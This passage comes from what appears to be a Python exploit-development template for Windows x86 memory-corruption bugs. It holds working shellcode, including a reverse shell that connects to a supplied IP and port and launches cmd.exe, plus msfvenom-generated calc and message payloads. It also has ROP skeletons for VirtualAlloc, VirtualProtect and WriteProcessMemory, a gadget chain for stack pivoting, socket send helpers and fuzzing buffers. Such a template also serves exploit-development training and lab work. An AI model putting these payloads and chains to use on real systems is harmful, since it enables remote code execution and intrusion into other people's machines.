            b"\x68\xa4\x1a\x70\xc7"            # 0x215       push 0xc7701aa4
            b"\xff\x55\x04"                    # 0x220       call dword ptr [ebp + 4]
            b"\x89\x45\x28"                    # 0x223       mov  dword ptr [ebp + 0x28], eax
            b"\x68\xa4\xad\x2e\xe9"            # 0x226       push 0xe92eada4
            b"\xff\x55\x04"                    # 0x231       call dword ptr [ebp + 4]
            b"\x89\x45\x2c"                    # 0x234       mov  dword ptr [ebp + 0x2c], eax
            b"\x68\xe5\x49\x86\x49"            # 0x237       push 0x498649e5
            b"\xff\x55\x04"                    # 0x242       call dword ptr [ebp + 4]
            b"\x89\x45\x30"                    # 0x245       mov  dword ptr [ebp + 0x30], eax
            b"\x31\xdb"                        # 0x248       xor  ebx, ebx
            b"\x66\xbb\x90\x01"                # 0x250       mov  bx, 0x190
            b"\x29\xdc"                        # 0x254       sub  esp, ebx
            b"\x54"                            # 0x256       push esp
            b"\x83\xc3\x72"                    # 0x257       add  ebx, 0x72
            b"\x53"                            # 0x260       push ebx
            b"\xff\x55\x1c"                    # 0x261       call dword ptr [ebp + 0x1c]
            b"\x31\xc0"                        # 0x264       xor  eax, eax
            b"\x50"                            # 0x266       push eax
            b"\x50"                            # 0x267       push eax
            b"\x50"                            # 0x268       push eax
            b"\xb0\x06"                        # 0x269       mov  al, 6
            b"\x50"                            # 0x271       push eax
            b"\x2c\x05"                        # 0x272       sub  al, 5
            b"\x50"                            # 0x274       push eax
            b"\x40"                            # 0x275       inc  eax
            b"\x50"                            # 0x276       push eax
            b"\xff\x55\x20"                    # 0x277       call dword ptr [ebp + 0x20]
            b"\x89\xc6"                        # 0x280       mov  esi, eax
            b"\x31\xc0"                        # 0x282       xor  eax, eax
            b"\x50"                            # 0x284       push eax
            b"\x50"                            # 0x285       push eax
            b"" + asmip + b""
            b"" + asmport + b""
            b"\xc1\xe0\x10"                    # 0x295       shl  eax, 0x10
            b"\x66\x83\xc0\x02"                # 0x298       add  ax, 2
            b"\x50"                            # 0x302       push eax
            b"\x54"                            # 0x303       push esp
            b"\x5f"                            # 0x304       pop  edi
            b"\x31\xc0"                        # 0x305       xor  eax, eax
            b"\x66\x83\xc0\x10"                # 0x307       add  ax, 0x10
            b"\x50"                            # 0x311       push eax
            b"\x57"                            # 0x312       push edi
            b"\x56"                            # 0x313       push esi
            b"\xff\x55\x28"                    # 0x314       call dword ptr [ebp + 0x28]
            b"\x6a\x01"                        # 0x317       push 1
            b"\x56"                            # 0x319       push esi
            b"\xff\x55\x2c"                    # 0x320       call dword ptr [ebp + 0x2c]
            b"\x31\xc0"                        # 0x323       xor  eax, eax
            b"\x50"                            # 0x325       push eax
            b"\x50"                            # 0x326       push eax
            b"\x56"                            # 0x327       push esi
            b"\xff\x55\x30"                    # 0x328       call dword ptr [ebp + 0x30]
            b"\x89\xc6"                        # 0x331       mov  esi, eax
            b"\x56"                            # 0x333       push esi
            b"\x56"                            # 0x334       push esi
            b"\x56"                            # 0x335       push esi
            b"\x31\xc0"                        # 0x336       xor  eax, eax
            b"\x50"                            # 0x338       push eax
            b"\x50"                            # 0x339       push eax
            b"\xb8\xfe\xfe\xff\xff"            # 0x340       mov  eax, 0xfffffefe
            b"\xf7\xd8"                        # 0x345       neg  eax
            b"\x50"                            # 0x347       push eax
            b"\x31\xc0"                        # 0x348       xor  eax, eax
            b"\x50"                            # 0x350       push eax
            b"\x50"                            # 0x351       push eax
            b"\x50"                            # 0x352       push eax
            b"\x50"                            # 0x353       push eax
            b"\x50"                            # 0x354       push eax
            b"\x50"                            # 0x355       push eax
            b"\x50"                            # 0x356       push eax
            b"\x50"                            # 0x357       push eax
            b"\x50"                            # 0x358       push eax
            b"\x50"                            # 0x359       push eax
            b"\xb0\x44"                        # 0x360       mov  al, 0x44
            b"\x50"                            # 0x362       push eax
            b"\x54"                            # 0x363       push esp
            b"\x5f"                            # 0x364       pop  edi
            b"\xb8\x9b\x87\x9a\xff"            # 0x365       mov  eax, 0xff9a879b
            b"\xf7\xd8"                        # 0x370       neg  eax
            b"\x50"                            # 0x372       push eax
            b"\x68\x63\x6d\x64\x2e"            # 0x373       push 0x2e646d63
            b"\x54"                            # 0x378       push esp
            b"\x5b"                            # 0x379       pop  ebx
            b"\x89\xe0"                        # 0x380       mov  eax, esp
            b"\x31\xc9"                        # 0x382       xor  ecx, ecx
            b"\x66\x81\xc1\x90\x03"            # 0x384       add  cx, 0x390
            b"\x29\xc8"                        # 0x389       sub  eax, ecx
            b"\x50"                            # 0x391       push eax
            b"\x57"                            # 0x392       push edi
            b"\x31\xc0"                        # 0x393       xor  eax, eax
            b"\x50"                            # 0x395       push eax
            b"\x50"                            # 0x396       push eax
            b"\x50"                            # 0x397       push eax
            b"\x40"                            # 0x398       inc  eax
            b"\x50"                            # 0x399       push eax
            b"\x48"                            # 0x400       dec  eax
            b"\x50"                            # 0x401       push eax
            b"\x50"                            # 0x402       push eax
            b"\x53"                            # 0x403       push ebx
            b"\x50"                            # 0x404       push eax
            b"\xff\x55\x18"                    # 0x405       call dword ptr [ebp + 0x18]
            b"\x31\xc9"                        # 0x408       xor  ecx, ecx
            b"\x51"                            # 0x410       push ecx
            b"\x6a\xff"                        # 0x411       push -1
            b"\xff\x55\x10"                    # 0x413       call dword ptr [ebp + 0x10]
        )
        return shellcode

    def asmcalcShellcode():
        # Source from: https://github.com/hodor-sec/Shellcoding/blob/master/shellcode/asm/calc/win_x86_winexec_calc_pic.asm
        # Payload size: 201 bytes
        shellcode = (
                b"\x89\xe5"                             # 0   / 0x0              mov ebp, esp
                b"\x81\xc4\xf0\xf9\xff\xff"             # 2   / 0x2              add esp, 0xfffff9f0
                b"\x31\xc9"                             # 8   / 0x8              xor ecx, ecx
                b"\x64\x8b\x71\x30"                     # 10  / 0xa              mov esi, dword ptr fs:[ecx + 0x30]
                b"\x8b\x76\x0c"                         # 14  / 0xe              mov esi, dword ptr [esi + 0xc]
                b"\x8b\x76\x1c"                         # 17  / 0x11             mov esi, dword ptr [esi + 0x1c]
                b"\x8b\x5e\x08"                         # 20  / 0x14             mov ebx, dword ptr [esi + 8]
                b"\x8b\x7e\x20"                         # 23  / 0x17             mov edi, dword ptr [esi + 0x20]
                b"\x8b\x36"                             # 26  / 0x1a             mov esi, dword ptr [esi]
                b"\x66\x39\x4f\x18"                     # 28  / 0x1c             cmp word ptr [edi + 0x18], cx
                b"\x75\xf2"                             # 32  / 0x20             jne 0x14
                b"\xeb\x06"                             # 34  / 0x22             jmp 0x2a
                b"\x5e"                                 # 36  / 0x24             pop esi
                b"\x89\x75\x04"                         # 37  / 0x25             mov dword ptr [ebp + 4], esi
                b"\xeb\x54"                             # 40  / 0x28             jmp 0x7e
                b"\xe8\xf5\xff\xff\xff"                 # 42  / 0x2a             call 0x24
                b"\x60"                                 # 47  / 0x2f             pushal
                b"\x8b\x43\x3c"                         # 48  / 0x30             mov eax, dword ptr [ebx + 0x3c]
                b"\x8b\x7c\x03\x78"                     # 51  / 0x33             mov edi, dword ptr [ebx + eax + 0x78]
                b"\x01\xdf"                             # 55  / 0x37             add edi, ebx
                b"\x8b\x4f\x18"                         # 57  / 0x39             mov ecx, dword ptr [edi + 0x18]
                b"\x8b\x47\x20"                         # 60  / 0x3c             mov eax, dword ptr [edi + 0x20]
                b"\x01\xd8"                             # 63  / 0x3f             add eax, ebx
                b"\x89\x45\xfc"                         # 65  / 0x41             mov dword ptr [ebp - 4], eax
                b"\xe3\x36"                             # 68  / 0x44             jecxz 0x7c
                b"\x49"                                 # 70  / 0x46             dec ecx
                b"\x8b\x45\xfc"                         # 71  / 0x47             mov eax, dword ptr [ebp - 4]
                b"\x8b\x34\x88"                         # 74  / 0x4a             mov esi, dword ptr [eax + ecx*4]
                b"\x01\xde"                             # 77  / 0x4d             add esi, ebx
                b"\x31\xc0"                             # 79  / 0x4f             xor eax, eax
                b"\x99"                                 # 81  / 0x51             cdq
                b"\xfc"                                 # 82  / 0x52             cld
                b"\xac"                                 # 83  / 0x53             lodsb al, byte ptr [esi]
                b"\x84\xc0"                             # 84  / 0x54             test al, al
                b"\x74\x07"                             # 86  / 0x56             je 0x5f
                b"\xc1\xca\x0d"                         # 88  / 0x58             ror edx, 0xd
                b"\x01\xc2"                             # 91  / 0x5b             add edx, eax
                b"\xeb\xf4"                             # 93  / 0x5d             jmp 0x53
                b"\x3b\x54\x24\x24"                     # 95  / 0x5f             cmp edx, dword ptr [esp + 0x24]
                b"\x75\xdf"                             # 99  / 0x63             jne 0x44
                b"\x8b\x57\x24"                         # 101 / 0x65             mov edx, dword ptr [edi + 0x24]
                b"\x01\xda"                             # 104 / 0x68             add edx, ebx
                b"\x66\x8b\x0c\x4a"                     # 106 / 0x6a             mov cx, word ptr [edx + ecx*2]
                b"\x8b\x57\x1c"                         # 110 / 0x6e             mov edx, dword ptr [edi + 0x1c]
                b"\x01\xda"                             # 113 / 0x71             add edx, ebx
                b"\x8b\x04\x8a"                         # 115 / 0x73             mov eax, dword ptr [edx + ecx*4]
                b"\x01\xd8"                             # 118 / 0x76             add eax, ebx
                b"\x89\x44\x24\x1c"                     # 120 / 0x78             mov dword ptr [esp + 0x1c], eax
                b"\x61"                                 # 124 / 0x7c             popal
                b"\xc3"                                 # 125 / 0x7d             ret
                b"\x68\x83\xb9\xb5\x78"                 # 126 / 0x7e             push 0x78b5b983
                b"\xff\x55\x04"                         # 131 / 0x83             call dword ptr [ebp + 4]
                b"\x89\x45\x10"                         # 134 / 0x86             mov dword ptr [ebp + 0x10], eax
                b"\x68\x66\x19\xda\x75"                 # 137 / 0x89             push 0x75da1966
                b"\xff\x55\x04"                         # 142 / 0x8e             call dword ptr [ebp + 4]
                b"\x89\x45\x14"                         # 145 / 0x91             mov dword ptr [ebp + 0x14], eax
                b"\x68\x8e\x4e\x0e\xec"                 # 148 / 0x94             push 0xec0e4e8e
                b"\xff\x55\x04"                         # 153 / 0x99             call dword ptr [ebp + 4]
                b"\x89\x45\x18"                         # 156 / 0x9c             mov dword ptr [ebp + 0x18], eax
                b"\x68\x98\xfe\x8a\x0e"                 # 159 / 0x9f             push 0xe8afe98
                b"\xff\x55\x04"                         # 164 / 0xa4             call dword ptr [ebp + 4]
                b"\x89\x45\x1c"                         # 167 / 0xa7             mov dword ptr [ebp + 0x1c], eax
                b"\xeb\x03"                             # 170 / 0xaa             jmp 0xaf
                b"\xff\x55\x14"                         # 172 / 0xac             call dword ptr [ebp + 0x14]
                b"\x31\xc0"                             # 175 / 0xaf             xor eax, eax
                b"\x40"                                 # 177 / 0xb1             inc eax
                b"\x50"                                 # 178 / 0xb2             push eax
                b"\x48"                                 # 179 / 0xb3             dec eax
                b"\x66\x50"                             # 180 / 0xb4             push ax
                b"\x68\x63\x61\x6c\x63"                 # 182 / 0xb6             push 0x636c6163
                b"\x89\xe3"                             # 187 / 0xbb             mov ebx, esp
                b"\x53"                                 # 189 / 0xbd             push ebx
                b"\xff\x55\x1c"                         # 190 / 0xbe             call dword ptr [ebp + 0x1c]
                b"\x31\xc9"                             # 193 / 0xc1             xor ecx, ecx
                b"\x51"                                 # 195 / 0xc3             push ecx
                b"\x6a\xff"                             # 196 / 0xc4             push -1
                b"\xff\x55\x10"                         # 198 / 0xc6             call dword ptr [ebp + 0x10]
        )
        return shellcode

    def msfcalcShellcode():
        # msfvenom -p windows/exec CMD="calc.exe" -a x86 -f python -v sc -e shellcode
        # Payload size: 193 bytes
        shellcode =  b""
        shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
        shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
        shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
        shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
        shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
        shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
        shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
        shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
        shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
        shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
        shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
        shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
        shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
        shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
        shellcode += b"\x63\x2e\x65\x78\x65\x00"
        return shellcode

    def msflocalmsgShellcode():
        # msfvenom -p windows/exec CMD="msg * HELLOHELLO" -a x86 -f python -v shellcode
        # Payload size: 201 bytes
        shellcode =  b""
        shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
        shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
        shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
        shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
        shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
        shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
        shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
        shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
        shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
        shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
        shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
        shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
        shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
        shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x6d\x73\x67"
        shellcode += b"\x20\x2a\x20\x48\x45\x4c\x4c\x4f\x48\x45\x4c"
        shellcode += b"\x4c\x4f\x00"
        return shellcode

    def encodedShellcode():
        shellcode = b""
        return shellcode

    def encodedShellcodeHex():
        shellcode = b""
        return shellcode

    def mappedbadscchars():
        badchars = b""
        return badchars

    def markedbadscchars():
        markedchars = []
        return markedchars

class ROP:
    # WriteProcessMemory
    # BOOL WriteProcessMemory(
    #   [in]  HANDLE  hProcess,
    #   [in]  LPVOID  lpBaseAddress,
    #   [in]  LPCVOID lpBuffer,
    #   [in]  SIZE_T  nSize,
    #   [out] SIZE_T  *lpNumberOfBytesWritten
    # );
    def wpmSkeleton(intwpmaddr=False,intbaselib=False,offsetscretaddr=False,rophprocess=False,payloadoffsecsc=False,ropnsize=False,offsetwritable=False):
        rop_skel_gadgets = [
            0x41414141,                             # WriteProcessMemory address                                    # intwpmaddr
            0x42424242,                             # Shellcode ret address                                         # offsetscretaddr  
            0xFFFFFFFF,                             # hProcess; Process handle == current process                   # rophprocess
            0x43434343,                             # lpBaseAddress; start of codecave address to write to, .text   # offsetscretaddr  
            0x44444444,                             # lpBuffer; Code to be copied                                   # payloadoffsetsc
            0x45454545,                             # nSize                                                         # ropnsize
            0x46464646,                             # *lpNumberOfBytesWritten                                       # offsetwritable 
        ]
        return rop_skel_gadgets

    # VirtualAlloc
    # Structure:                                 Parameters:
    # LPVOID WINAPI VirtualAlloc(          =>    A pointer to VirtualAlloc()
    #   _In_opt_  LPVOID lpAddress,        =>    Return Address 
    #   _In_      SIZE_T dwSize,           =>    dwSize (0x1) 
    #   _In_      DWORD flAllocationType,  =>    flAllocationType (0x1000) 
    #   _In_      DWORD flProtect          =>    flProtect (0x40) 
    # );
    def vaSkeleton(intvaaddr=False,offsetscretaddr=False,ropdwsize=False,ropflallocationtype=False,ropflprotect=False):
        rop_skel_gadgets = [
            0x41414141,                             # VirtualAlloc address                                          # intvaaddr
            0x42424242,                             # Shellcode ret address                                         # offsetscretaddr
            0x43434343,                             # lpAddress; shellcode address, same as above                   # offsetscretaddr
            0x44444444,                             # dwSize; size of shellcode == 0x1                              # ropdwsize
            0x45454545,                             # flAllocationType == 0x1000                                    # ropflallocationtype
            0x46464646,                             # flProtect == 0x40                                             # ropflprotect
        ]
        return rop_skel_gadgets
    
    # VirtualProtect
    # Structure:                                 Parameters:
    # BOOL VirtualProtect(						--> A pointer to VirtualProtect() ESI
    #  [in]  LPVOID lpAddress,					--> Return Address (Redirect Execution to ESP) ESP
    #  [in]  SIZE_T dwSize,						--> dwSize up to you to chose as needed (0x201) EBX
    #  [in]  DWORD  flNewProtect,				--> flNewProtect (0x40) EDX
    #  [out] PDWORD lpflOldProtect				--> A writable pointer ECX
    # );
    def vpSkeleton(intvpaddr=False,offsetscretaddr=False,ropdwsize=False,ropflnewprotect=False,offsetwritable=False):
        rop_skel_gadgets = [
            0x41414141,                             # VirtualProtect address                                        # intvpaddr
            0x42424242,                             # Shellcode ret address                                         # offsetscretaddr
            0x43434343,                             # lpAddress; shellcode address, same as above                   # offsetscretaddr
            0x44444444,                             # dwSize; size of shellcode                                     # ropdwsize
            0x45454545,                             # flNewProtect == 0x40 RWX                                      # ropflnewprotect
            0x46464646,                             # lpflOldProtect; some writable address                         # offsetwritable
        ]
        return rop_skel_gadgets 

    def chainWriteProcessMemory(intbaselib,payloadoffsetsc,ropskeloffsetlpbuf,ropdecoderoffseteax):
        rop_chain1_gadgets = [
            ### ESP Alignment ###
            # Save current ESP in ESI and EAX
            ropjunk,                                            # Filler
            intbaselib + 0x408d6,                               # push esp ; pop esi ; ret ;
            
            # Patch lpBuffer in ROP skeleton


            # Pointer of lpBuffer in ROP skeleton


            # Patch nSize in ROP skeleton

            # Align EAX with shellcode
              
        ]
        return rop_chain1_gadgets

    def chainVirtualAlloc(intbaselib,offsetwritable,offsetk32heapfree,offsetk32va,ropskelfuncOffset,ropskelscOffset,ropskeleaxscOffset):
        # Optionally; PUSHAD GOALS
        # EAX ???????? => &Kernel32!VirtualAlloc
        # EBX 00000001 => dwSize
        # ECX 00000040 => flProtect
        # EDX 00001000 => flAllocationType
        # ESP ???????? => Unmodified
        # EBP ???????? => Skip 4 bytes
        # ESI ???????? => JMP [EAX]
        # EDI ???????? => RETNOP
        #
        rop_chain1_gadgets = [
            ### Future usage ###
            # Clear ESI for future usage

            
            ### ESP Alignment ###
            # Save current ESP in EAX

            # Save to ESI as well
     
            # Use add method for EAX to calculate offset to ROP skeleton
                                       
            
            ### Dereference PTR for VirtualAlloc address ###
    
            # Copy dereferenced value in EDX
                  
            
            ### Shellcode ret address ###
            # Move to next ROP skel argument
 
            # Restore former ESP value stored in ESI for calculations

            # Use add method for EAX to calculate offset to shellcode offset
              
            # Copy dereferenced value in EDX

            # Copy value to EDI additionally for future use

                 
            ### lpAddress; same as above ###
            # Move to next ROP skel argument
          
            # Copy dereferenced value in EDX

                                   
            ### dwSize == 0x1 ###
            # Move to next ROP skel argument

            # Calculate value by negating

            # Copy dereferenced value in EDX

            
            ### flAllocationType == 0x1000 ###
             # Move to next ROP skel argument

             # Calculate value by negating

            # Copy dereferenced value in EDX
         
                       
            ### flProtect == 0x40 ###
            # Move to next ROP skel argument
 
            # Calculate value by negating

            # Copy dereferenced value in EDX

            
            ### Align EAX with shellcode ###
            # Copy previously stored value in EDI to EAX
       
            
                                 
        ]
        return rop_chain1_gadgets

    def chainVirtualProtect(intbaselib,intptrk32vp,ropskelfuncOffset,ropskelscOffset,ropskeloldProtect,ropskeleaxscOffset):
        # Optionally; PUSHAD GOALS
        # EDI - Ptr to RETN
        # ESI - VirtualProtect()
        # EBP - RET pointer
        # ESP - lpAddress
        # EBX - dwSize
        # EDX - flNewProtect
        # ECX - lpflOldProtect
        # EAX - NOPS
        #
        rop_chain1_gadgets = [
            ### ESP Alignment ###
            # Save current ESP in xxx
            intbaselib + 0x0,
            # Use add method for EAX to calculate offset

            ### VirtualProtect address ###

            
            ### Shellcode ret address ###
            # Exchange EBX for EDX to save value; copy to EAX for calculations

            # Add method

            # Restore EBX            

            
            ### lpAddress; same as above ###

            
            ### dwSize ###

            
            ### flNewProtect ###


            ### lpflOldProtect ###        
 

            # Align EAX with shellcode

        ]
        return rop_chain1_gadgets

    def chainscDecoder(intbaselib,encodedsc,offsetDecoding):
        rop_chainscDecoder_gadgets = Helpers.decodeShellcode(intbaselib,encodedsc,offsetDecoding)
        return rop_chainscDecoder_gadgets  

    def chainropskelAlign(intbaselib,ropskelalign,offsetwritable=False):
        rop_chainropskelAlign_gadgets = [
            ### Align EAX with shellcode ###
            # Save current ESP in EAX

            # Use add method for EAX to calculate offset to shellcode offset

        ]
        return rop_chainropskelAlign_gadgets

    def ropespAlign(offsetesp):
        rop_espalign_gadgets = [
            0x66aca8,                               # push esp ; sub eax, 0x20 ; pop ebx ; ret ;
            0x667a0d,                               # mov eax, ebx ; pop esi ; pop ebx ; ret ;
            0x69696969,                             # Filler
            0x69696969,                             # Filler
            0x67d5c9,                               # pop ecx ; ret 
            0x88888888,                             # Filler for addition
            0x67023f,                               # add eax, ecx ; pop esi ; ret ;
            0x69696969,                             # Filler
            0x67d5c9,                               # pop ecx ; ret          
            Helpers.addhex(offsetesp),              # Add ESP offset
            0x67023f,                               # add eax, ecx ; pop esi ; ret ;
            0x69696969,                             # Filler
            0x483aab,                               # xchg eax, esp ; ret        
        ]
        return rop_espalign_gadgets

class Network:
    class TCP:
        # Create a regular TCP socket
        def createsocktcp(host,port, timeout=timeout):
            socktcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socktcp.settimeout(timeout)
            socktcp.connect((host, port))
            return socktcp

        # Use or create the global TCP socket
        def creategsocktcp(host, port, timeout=timeout):
            global sock
            # If sock is None or closed, recreate the socket
            if not sock or sock.fileno() == -1:
                if sock:
                    sock.close()  # Close the existing socket if it's closed manually
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))
            return sock

        # Use or create global TCP socket; send and buffered receive
        def sendrecvsocktcp(buffer, recvsize=1024, recvbuffered=False, sendall=False, keepopen=True):
            global sock
            try:
                # Check if the socket is open, otherwise create a new one
                if not (sock and sock.fileno() != -1):
                    print("[!] Socket not open, reopening...")
                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
                # Send data
                if sendall:
                    sock.sendall(buffer)
                else:
                    sock.send(buffer)
                # Receive buffered data
                if recvbuffered:
                    chunksize = 0
                    resp = b""
                    # Receive initial response and response size
                    initresp = sock.recv(recvsize)
                    respsize = len(initresp)
                    print(f"Received initial size data: {hex(respsize)}")
                    try:
                        #respsize = len(initresp)
                        print(f"[*] The read/write size returned: {hex(respsize)} bytes")
                    except ValueError:
                        print("[!] Error parsing the response size")
                        return None
                    # Continuously receive chunks until the full response is received
                    while chunksize < respsize:
                        chunk = sock.recv(respsize - chunksize)
                        if not chunk:  # Handle case where no data is received (e.g., connection closed)
                            print("[!] Socket closed or no data received.")
                            break
                        chunksize += len(chunk)
                        resp += chunk
                    # Return the response and close socket if required
                    return resp if keepopen else (resp, sock.close())
                # Receive unbuffered data
                else:
                    resp = sock.recv(recvsize)
                    if not keepopen:
                        sock.close()
                    return resp
            except socket.timeout:
                print("[!] Socket timeout.")
                if not keepopen:
                    sock.close()
                sys.exit(0)
            except Exception as e:
                print(f"[!] Error: {e}")
                traceback.print_exc()
                if sock:
                    sock.close()
                sys.exit(0)
            except KeyboardInterrupt:
                print("[!] Operation interrupted by user.")
                if sock:
                    sock.close()
                sys.exit(0)

        # Use or create global TCP socket; send and buffered receive
        def sendsocktcp(buffer, sendall=False, keepopen=True):
            global sock
            try:
                # Check if the socket is open, otherwise create a new one
                if not (sock and sock.fileno() != -1):
                    print("[!] Socket not open, reopening...")
                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
                # Send data
                if sendall:
                    sock.sendall(buffer)
                else:
                    sock.send(buffer)
                if not keepopen:
                    sock.close()
            except socket.timeout:
                print("[!] Socket timeout.")
                if not keepopen:
                    sock.close()
                sys.exit(0)
            except Exception as e:
                print(f"[!] Error: {e}")
                traceback.print_exc()
                if sock:
                    sock.close()
                sys.exit(0)
            except KeyboardInterrupt:
                print("[!] Operation interrupted by user.")
                if sock:
                    sock.close()
                sys.exit(0)
                
        # Use or create global TCP socket; receive only
        def recvsocktcp(recvsize=1024, keepopen=True):
            global sock
            try:
                # Check if the socket is open, otherwise create a new one
                if not (sock and sock.fileno() != -1):
                    print("[!] Socket not open, reopening...")
                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
                # Send data
                resp = sock.recv(recvsize)
                if not keepopen:
                    sock.close()
                return resp
            except socket.timeout:
                print("[!] Socket timeout.")
                if not keepopen:
                    sock.close()
                sys.exit(0)
            except Exception as e:
                print(f"[!] Error: {e}")
                traceback.print_exc()
                if sock:
                    sock.close()
                sys.exit(0)
            except KeyboardInterrupt:
                print("[!] Operation interrupted by user.")
                if sock:
                    sock.close()
                sys.exit(0)

        def recvsocktcp_readline(keepopen=True, timeout=None):
            global sock
            try:
                # Check if the socket is open, otherwise create a new one
                if not (sock and sock.fileno() != -1):
                    print("[!] Socket not open, reopening...")
                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
                if timeout:
                    sock.settimeout(timeout)  # Set socket timeout if provided
                # Read data line by line from the socket
                data = sock.makefile('r'). readline()  # Using makefile() to handle readline
                if not data:
                    print("[!] No data received.")
                    if not keepopen:
                        sock.close()
                    return None
                # If the connection is to be closed after reading one line
                if not keepopen:
                    sock.close()
                return data.strip()  # Strip newline and return the line

            except socket.timeout:
                print("[!] Socket timeout.")
                if not keepopen:
                    sock.close()
                sys.exit(0)

            except Exception as e:
                print(f"[!] Error: {e}")
                traceback.print_exc()
                if sock:
                    sock.close()
                sys.exit(0)

            except KeyboardInterrupt:
                print("[!] Operation interrupted by user.")
                if sock:
                    sock.close()
                sys.exit(0)
                        
        # Regular sendrecv TCP socket
        def sendrecvtcp(host,port,buffer,recv=True,recvsize=1024):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, int(port)))
                s.send(buffer)
                if recv:
                    response = s.recv(recvsize)
                    s.close()
                    return response
                else:
                    s.close()
                    return False
            except Exception:
                traceback.print_exc()
                sys.exit(0)
            except KeyboardInterrupt:
                Helpers.keyboard_interrupt() 

        # Only sending TCP socket, no receiving
        def sendtcp(host,port,buffer):
            try:
                print("Sending buffer...")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, int(port)))
                s.send(buffer)
                s.close()
            except Exception:
                traceback.print_exc()
                sys.exit(0)
            except KeyboardInterrupt:
                Helpers.keyboard_interrupt() 

        # Flush a given or global TCP socket
        def flushsocktcp(timeout=timeout,chunk_size=1024,retries=5):
            global sock
            # Check if the socket is valid and initialized
            if not isinstance(sock, socket.socket):
                raise ValueError("No socket to flush.")
            attempts = 0
            try:
                sock.settimeout(timeout)
                while attempts < retries:
                    # Try to read data from the socket
                    data = sock.recv(chunk_size)
                    print(data)
                    if not data:
                        break  # No more data, buffer is flushed
                    # Optionally handle or discard data
                    attempts += 1
                if attempts == retries:
                    print(f"[!] Maximum read attempts ({retries}) reached without completing buffer flush.")
            except socket.timeout:
                print("Socket timeout reached while flushing buffer.")
            except socket.error as e:
                print(f"Error while flushing buffer: {e}")

    class UDP:
        def createsockudp(host,port):
            sockudp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sockudp.connect((host, port))
            return sockudp

        def sendrecvudp(host,port,buffer,recvsize=1024,verbose=False):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(timeout)
                start = time.time()
                try:
                    s.sendto(buffer, (host, int(port)))
                    resp = s.recvfrom(recvsize)
                    s.close()
                    end = time.time()
                    elapsed = end - start
                    if verbose:
                        print("[*] Time elapsed sending UDP packet: " + str(elapsed))
                    return resp
                except socket.timeout:
                    print("[!] Connection timed out")
                    exit(0)
            except Exception:
                traceback.print_exc()
                sys.exit(0)
            except KeyboardInterrupt:
                Helpers.keyboard_interrupt() 

class Payload:
    def fuzz():
        # Lengths
        maxlen = 0x1000
        
        # Offsets
        
        # Building buffer
        buffer = b""
        buffer += b"A" * maxlen

        return buffer
        
    def leakaddr():
        # Lengths
        maxlen = 0x15000
        
        # Building buffer
        buffer = b""
        buffer += b"F" * (maxlen - len(buffer))

        lenpacket = pack(">i", len(buffer) - 4)

        return lenpacket + buffer

    def poccrash():
        
        # Lengths
        maxlen = 0x4000
        
        # Building buffer
        buffer = b""
        buffer += b"E" * (maxlen - len(buffer))

        return buffer
   
class Program:
    def sendFunction(opcode):
